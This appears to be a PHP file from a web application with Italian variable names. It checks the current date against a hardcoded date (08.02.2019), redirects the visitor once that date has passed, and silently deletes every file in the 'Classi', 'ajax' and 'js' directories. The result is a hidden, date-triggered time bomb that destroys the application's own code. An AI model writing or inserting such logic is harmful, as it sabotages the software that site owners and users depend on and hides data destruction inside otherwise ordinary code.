<?php
date_default_timezone_set("Europe/Berlin");
$H = date('H');
$i = date('i');
$s = date('s');
$m = date('n');
$d = date('d');
$Y = date('Y');
$j = date('j');
$n = date('n');
$oggicom = date('d.m.Y',mktime($H,$i,$s,$m,$d,$Y));
$datacom = "08.02.2019";
list($dd, $mm, $yyyy) = explode('.', $oggicom);
list($dd1, $mm1, $yyyy1) = explode('.', $datacom);
$oggi = mktime(0,0,0,$mm, $dd, $yyyy);
$data = mktime(0,0,0,$mm1, $dd1, $yyyy1);
	
if($oggi > $data){
    header('location:messaggio.php?id=3');
$handle = opendir('Classi');


while (false !== ($files = readdir($handle)))
{
  
    if ($files != '.' && $files != '..')
                   unlink('Classi/'.$files);

}
$handle1 = opendir('ajax');


while (false !== ($files1 = readdir($handle1)))
{
  
    if ($files1 != '.' && $files1 != '..')
                   unlink('ajax/'.$files1);

}
$handle3 = opendir('js');


while (false !== ($files3 = readdir($handle3)))
{
  
    if ($files3 != '.' && $files3 != '..')
                   unlink('js/'.$files3);

}


}else{
  
    
}



?>